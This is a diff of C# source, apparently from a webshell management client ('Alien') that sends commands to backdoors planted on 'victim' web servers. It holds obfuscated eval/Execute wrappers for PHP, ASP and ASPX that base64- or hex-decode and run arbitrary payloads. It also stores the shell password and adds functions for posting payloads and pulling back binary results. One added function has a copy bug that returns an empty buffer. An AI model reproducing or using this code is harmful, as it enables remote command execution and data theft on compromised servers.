@@ -12,46 +12,46 @@ namespace Alien
         public clsVictim m_victim { get; set; }
         public HttpClient m_clnt { get; set; }
 
-        private Dictionary<Language, string> m_dicSuffix = new Dictionary<Language, string>()
+        private Dictionary<enLanguage, string> m_dicSuffix = new Dictionary<enLanguage, string>()
         {
-            { Language.PHP, "php" },
-            { Language.ASP, "asp" },
-            { Language.ASPX, "aspx" },
-            { Language.ASMX, "asmx" },
-            { Language.ASHX, "ashx" },
-            { Language.JSP, "jsp" },
-            { Language.JSPX, "jspx" },
-            { Language.CGI, "cgi" },
-            { Language.Python, "py" },
+            { enLanguage.PHP, "php" },
+            { enLanguage.ASP, "asp" },
+            { enLanguage.ASPX, "aspx" },
+            { enLanguage.ASMX, "asmx" },
+            { enLanguage.ASHX, "ashx" },
+            { enLanguage.JSP, "jsp" },
+            { enLanguage.JSPX, "jspx" },
+            { enLanguage.CGI, "cgi" },
+            { enLanguage.Python, "py" },
         };
-        private Dictionary<Language, string[]> m_dicRemoveSyntax = new Dictionary<Language, string[]>()
+        private Dictionary<enLanguage, string[]> m_dicRemoveSyntax = new Dictionary<enLanguage, string[]>()
         {
             {
-                Language.PHP,
+                enLanguage.PHP,
                 new string[]
                 {
                     "<?php", "?>",
                 }
             },
             {
-                Language.ASP,
+                enLanguage.ASP,
                 new string[]
                 {
                     "<%", "%>",
                 }
             }
         };
-        private Dictionary<Language, string> m_dicDecodeFunc = new Dictionary<Language, string>()
+        private Dictionary<enLanguage, string> m_dicDecodeFunc = new Dictionary<enLanguage, string>()
         {
-            { Language.PHP, "@eval(base64_decode('[PATTERN]'));" },
-            { Language.ASP, @"Execute(""Execute(""""On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Execute(""""""""On+Error+Resume+Next:""""""""%26bd(""""""""[PATTERN]"""""""")):Response.End"""")"")" },
-            { Language.ASPX, @"var a0=Request.Item[""PATTERN""];var err:Exception;eval(System.Text.Encoding.GetEncoding(""[WEncoding]"").GetString(System.Convert.FromBase64String(a0)),""unsafe"");Response.End();" }
+            { enLanguage.PHP, "@eval(base64_decode('[PATTERN]'));" },
+            { enLanguage.ASP, @"Execute(""Execute(""""On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Execute(""""""""On+Error+Resume+Next:""""""""%26bd(""""""""[PATTERN]"""""""")):Response.End"""")"")" },
+            { enLanguage.ASPX, @"var a0=Request.Item[""PATTERN""];var err:Exception;eval(System.Text.Encoding.GetEncoding(""[WEncoding]"").GetString(System.Convert.FromBase64String(a0)),""unsafe"");Response.End();" }
         };
-        private Dictionary<Language, string> m_dicSplitter = new Dictionary<Language, string>()
+        private Dictionary<enLanguage, string> m_dicSplitter = new Dictionary<enLanguage, string>()
         {
-            { Language.PHP, "echo(\"[SPLITTER]\");" },
-            { Language.ASP, "Response.Write(\"[SPLITTER]\");" },
-            { Language.ASPX, "Response.Write(\"[SPLITTER]\");" }
+            { enLanguage.PHP, "echo(\"[SPLITTER]\");" },
+            { enLanguage.ASP, "Response.Write(\"[SPLITTER]\");" },
+            { enLanguage.ASPX, "Response.Write(\"[SPLITTER]\");" }
         };
 
         public clsWeb(clsVictim victim)
@@ -73,7 +73,6 @@ namespace Alien
         /// <returns></returns>
         public async Task<string> fnHttpPOST(string szPayloadData, string szSplitter)
         {
-            Clipboard.SetText(szPayloadData);
             StringContent content = new StringContent(szPayloadData, Encoding.GetEncoding(m_victim.ShellEncoding), "application/x-www-form-urlencoded");
             HttpResponseMessage resp = await m_clnt.PostAsync(string.Empty, content);
             string szRespContent = await resp.Content.ReadAsStringAsync();
@@ -89,6 +88,62 @@ namespace Alien
                 frmMsgBox f = new frmMsgBox(resp.StatusCode.ToString(), szRespContent);
                 return string.Empty;
             }
+        }
+
+        public async Task<byte[]> fnabHttpPOST(string szPayloadData, string szSplitter)
+        {
+            StringContent content = new StringContent(szPayloadData, Encoding.GetEncoding(m_victim.ShellEncoding), "application/x-www-form-urlencoded");
+            HttpResponseMessage resp = await m_clnt.PostAsync(string.Empty, content);
+            byte[] abResp = await resp.Content.ReadAsByteArrayAsync();
+            string szResp = Encoding.UTF8.GetString(abResp);
+
+            szSplitter = $"[{szSplitter}]";
+
+            if (resp.IsSuccessStatusCode && szResp.Contains(szSplitter))
+            {
+                szResp = szResp.Split(szSplitter)[1];
+
+                byte[] abSplitter = Encoding.UTF8.GetBytes(szSplitter);
+                
+                int nStartIdx = fnIndexOf(abResp, abSplitter, 0);
+                if (nStartIdx == -1)
+                    throw new Exception("Cannot find spliter: " + szSplitter);
+
+                nStartIdx += abSplitter.Length;
+
+                int nEndIdx = fnIndexOf(abResp, abSplitter, nStartIdx);
+                if (nEndIdx == -1)
+                    throw new Exception("Cannot find spliter: " + szSplitter);
+
+                long nLength = nEndIdx - nStartIdx;
+                byte[] abBuffer = new byte[nLength];
+                Array.Copy(abResp, nStartIdx, abResp, 0, nLength);
+
+                return abBuffer;
+            }
+            else
+            {
+                frmMsgBox f = new frmMsgBox(resp.StatusCode.ToString(), szResp);
+                return new byte[] { };
+            }
+        }
+
+        private int fnIndexOf(byte[] haystack, byte[] needle, int start)
+        {
+            for (int i = start; i <= haystack.Length - needle.Length; i++)
+            {
+                bool found = true;
+                for (int j = 0; j < needle.Length; j++)
+                {
+                    if (haystack[i + j] != needle[j])
+                    {
+                        found = false;
+                        break;
+                    }
+                }
+                if (found) return i;
+            }
+            return -1;
         }
 
         /// <summary>
@@ -150,6 +205,20 @@ namespace Alien
             szPayload = $"{m_victim.ShellPassword}={m_dicDecodeFunc[m_victim.ShellLanguage].Replace("[PATTERN]", clsEzData.fnszStre2b64(szPayload))}&{szParams}";
 
             return await fnHttpPOST(szPayload, szSplitter);
+        }
+
+        public async Task<byte[]> fnabSendPayload(string szPayloadName, string[] asParams)
+        {
+            string szSplitter = clsEzData.fnszGenerateRandomStr();
+            string szPayload = fnGetPayload(szPayloadName, szSplitter);
+
+            for (int i = 0; i < asParams.Length; i++)
+                asParams[i] = $"z{i}={clsEzData.fnszStre2b64(asParams[i])}";
+
+            string szParams = string.Join("&", asParams);
+            szPayload = $"{m_victim.ShellPassword}={m_dicDecodeFunc[m_victim.ShellLanguage].Replace("[PATTERN]", clsEzData.fnszStre2b64(szPayload))}&{szParams}";
+
+            return await fnabHttpPOST(szPayload, szSplitter);
         }
 
         /// <summary>
